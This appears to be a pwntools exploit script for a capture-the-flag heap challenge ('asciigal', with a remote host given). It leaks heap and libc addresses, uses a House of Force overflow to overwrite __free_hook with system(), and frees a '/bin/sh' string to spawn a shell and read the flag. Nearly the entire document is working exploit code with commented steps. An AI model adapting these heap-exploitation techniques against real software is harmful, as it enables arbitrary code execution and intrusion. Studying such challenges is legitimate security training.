#!/usr/bin/python3
from pwn import *
import sys
import time

# Function to create a new article in the application
def new_article(name, size, payload):
    p.recvuntil("> ")              # Wait for the main menu prompt
    p.sendline("0")                # Select the option to create a new article
    p.recvuntil("name> ")          # Wait for the prompt to enter the article name
    p.sendline(name)               # Send the name of the article
    p.recvuntil("art sz> ")        # Wait for the prompt to enter the size of the article
    p.sendline("%d" % size)        # Send the size of the article payload
    time.sleep(0.05)               # Small delay to ensure proper execution
    p.sendline(payload)            # Send the actual content (payload) of the article

# Function to print an article by its ID
def print_article(id):
    p.recvuntil("> ")              # Wait for the main menu prompt
    p.sendline("1")                # Select the option to print an article
    p.recvuntil("art#> ")          # Wait for the prompt to enter the article ID
    p.sendline("%d" % id)          # Send the ID of the article to print

# Function to delete an article by its ID
def delete_article(id):
    p.recvuntil("> ")              # Wait for the main menu prompt
    p.sendline("2")                # Select the option to delete an article
    p.recvuntil("art#> ")          # Wait for the prompt to enter the article ID
    p.sendline("%d" % id)          # Send the ID of the article to delete

# Function to edit an existing article by its ID
def edit_article(id, name, size, payload):
    p.recvuntil("> ")              # Wait for the main menu prompt
    p.sendline("3")                # Select the option to edit an article
    p.recvuntil("art#> ")          # Wait for the prompt to enter the article ID
    p.sendline("%d" % id)          # Send the ID of the article to edit
    p.recvuntil("name> ")          # Wait for the prompt to enter the new name
    p.sendline(name)               # Send the new name for the article
    p.recvuntil("art sz> ")        # Wait for the prompt to enter the new size
    p.sendline("%d" % size)        # Send the new size of the article payload
    time.sleep(0.05)               # Small delay to ensure proper execution
    p.sendline(payload)            # Send the new content (payload) of the article

# Function to initialize the exploit, handles both local and remote execution
def start():
    global p, libc, offset
    try:
        if(sys.argv[1] == "-r"):   # Check if the script is running in remote mode
            host, port = "jinblack.it", 3004  # Remote server details
            p = remote(host, port) # Establish a remote connection

        elif(sys.argv[1] == "-d"): # Check if the script is running in debug mode
            gdb_script = """
				c
			"""
            p = process("./asciigal", env={'LD_PRELOAD': './libc-2.27.so'}) # Start the process with a custom libc
            gdb.attach(p, gdb_script) # Attach gdb to the process for debugging

    except:                         # If no valid option is provided, run locally
        print("Starting locally")
        print("Usage ./x.py [-OPTIONS]")
        print("-r to work remotely")
        print("-d to debug")
        p = process("./asciigal", env={'LD_PRELOAD': './libc-2.27.so'}) # Start the process locally with custom libc

# Global variables setup
global p, elf, libc
context(arch='x86_64', os='linux', endian='little', word_size='64')  # Set the context for the exploit
elf = ELF("./asciigal")            # Load the target binary
libc = ELF("./libc-2.27.so")       # Load the custom libc for exploitation
libc_offset = 0x3ebca0             # Offset for libc base address
heap_offset = 0x460                # Offset for heap base address
top_chunk_offset = 0xef8           # Offset for top chunk in heap
start()                            # Start the exploit

# Step 1: Leak the heap address
print("[1]-Leaking heap addresses...")
new_article("A"*4, 32, "A"*4)      # Create a new article to manipulate heap
new_article("B"*4, 32, "B"*4)      # Create another article

delete_article(1)                  # Delete the second article to free space in heap

new_article("A"*4, 32, "A"*4)      # Create a new article to reuse the freed space
print_article(1)                   # Print the article to leak heap information

heap_leak = u64(p.recv(42)[34:])   # Extract the leaked heap address
heap_base = heap_leak + heap_offset # Calculate the base address of the heap
top_chunk = heap_base + top_chunk_offset # Calculate the address of the top chunk
print("\t\tHeap base address: ", hex(heap_base))
print("\t\tTop chunk address: ", hex(top_chunk))

for i in range(1, 3):
    delete_article(i)              # Clean up by deleting the articles

# Step 2: Leak libc address using an unsorted bin attack
print("[2]-Leaking libc addresses...")
for i in range(10):
    new_article("abcdef%d" % i, 0x150, "%d" % i) # Create multiple articles to fill tcache
    time.sleep(0.05)

for i in range(1, 10):
    delete_article(i)              # Delete articles to move them to the unsorted bin
    time.sleep(0.05)

for i in range(10):
    new_article("qwert%d" % (i), 0x150, "") # Create new articles to trigger unsorted bin reuse
    time.sleep(0.05)

print_article(8)                   # Print the article to leak libc information

libc_leak = u64(p.recv(35)[28:]+b"\x00") # Extract the leaked libc address
libc.address = libc_leak - libc_offset # Calculate the base address of libc
print("\t\tLibc leaked address: ", hex(libc_leak))
print("\t\tLibc base address: ", hex(libc.address))
print("\t\tFree_hook address:", hex(libc.symbols['__free_hook']))

# Step 3: Prepare for House of Force attack
print("[3]-Preparing house of force...")
malloc_size = (libc.symbols['__free_hook'] - top_chunk - 0x20) # Calculate the size needed to move the top chunk
payload = b"\x00"*0x158 + p64(0xffffffffffffffff) + b"\x00"*0x10 # Prepare the payload to overwrite the top chunk size

# Step 4: Overwrite the top chunk size and set the article name to '/bin/sh\x00'
print("[4]-Overwriting the top chunk size...")
edit_article(7, "/bin/sh\x00", len(payload) + 0x20, payload) # Exploit the overflow to overwrite the top chunk size

# Free up some space by deleting articles
delete_article(1)
delete_article(3)

# Move the top chunk to the target location
new_article(b"whatever", malloc_size, b"WHATEVER")

# Step 5: Overwrite __free_hook with the system address to hijack control flow
print("[5]-Overwriting __free_hook with the system address...")
new_article("powned", 123, p64(libc.symbols['system'])*3) # Overwrite the __free_hook with system() address

# Step 6: Trigger the exploit to get a shell
delete_article(7)                  # Trigger the free() call on the "/bin/sh" string
time.sleep(1)

print("[6]-Getting the flag:")
p.sendline('cat flag')             # Send command to read the flag
p.interactive()                    # Switch to interactive mode to interact with the shell
